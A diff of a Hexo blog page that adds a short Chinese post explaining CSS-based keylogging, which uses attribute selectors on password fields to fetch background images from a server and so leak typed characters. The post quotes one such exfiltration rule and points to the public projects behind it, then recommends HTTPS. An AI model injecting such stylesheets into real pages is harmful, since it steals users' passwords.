@@ -15,7 +15,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>归档 ~ Hexo</title>
+  <title>使用Css获取用户密码 ~ Hexo</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -36,7 +36,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -107,6 +107,41 @@
             </span>
 
             
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  星期一, 十二月 2日 2019, 3:58 下午
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    568 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      2 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
           </div>
 
           
@@ -117,47 +152,62 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5 z-depth-3" id="board">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">共计 7 篇文章</p>
-  <hr>
-  
-    
       
-      <p class="h5">2019</p>
-    
-    <a href="/2019/11/23/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5SQL%E8%AF%AD%E5%8F%A5/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">MySQL数据库增删改查SQL语句</span>
-      <span style="float: right;">11-23</span>
-    </a>
-  
-    
-    <a href="/2019/11/23/jsp%E7%9A%84request%E5%AF%B9%E8%B1%A1/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">jsp的request对象</span>
-      <span style="float: right;">11-23</span>
-    </a>
-  
-    
-    <a href="/2019/11/23/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E9%9F%B3%E4%B9%90/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">在博客中添加音乐</span>
-      <span style="float: right;">11-23</span>
-    </a>
-  
-</div>
 
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <h3 id="不一样的-css"><a href="#不一样的-css" class="headerlink" title="不一样的 css"></a>不一样的 css</h3><p>说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。</p>
+<p>话题回到不一样的 css 上，github 上 <a href="https://github.com/jbtronics" target="_blank" rel="noopener">jbtronics</a> 给出了这样一份答案 <a href="https://github.com/jbtronics/CrookedStyleSheets" target="_blank" rel="noopener">CrookedStyleSheets</a>，在这里笔者直接给上该项目的<a href="https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md" target="_blank" rel="noopener">中文文档</a>，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。</p>
+<h3 id="css-监听键盘记录"><a href="#css-监听键盘记录" class="headerlink" title="css 监听键盘记录"></a>css 监听键盘记录</h3><p><a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，<a href="https://github.com/maxchehab/CSS-Keylogging" target="_blank" rel="noopener">CSS-Keylogging</a> 更为巧妙的使用多重选择器去捕获相应的按键事件。</p>
+<p>核心代码如下:</p>
+<pre><code>input[type=&quot;password&quot;][value$=&quot;1&quot;] { background-image: url(&quot;http://localhost:3000/1&quot;); }</code></pre><p>解释如下：</p>
+<p>当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 <code>http://localhost:3000/1</code> 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。</p>
+<p>当 <code>value$=&quot;1&quot;</code> 时，我们可以监听用户输入 <code>1</code>，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：</p>
+<p><img src="http://blog.static.minfive.com/post/18-02-23/code.png" srcset="undefined" alt="code"></p>
+<p>当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。</p>
 
-              </div>
-            </div>
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+            
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
           </div>
         </div>
       </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+  </div>
+</div>
+
     
   </main>
 
@@ -232,6 +282,11 @@
 
 
 
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
 
 
   <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
@@ -272,7 +327,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "归档&nbsp;",
+        "使用Css获取用户密码&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
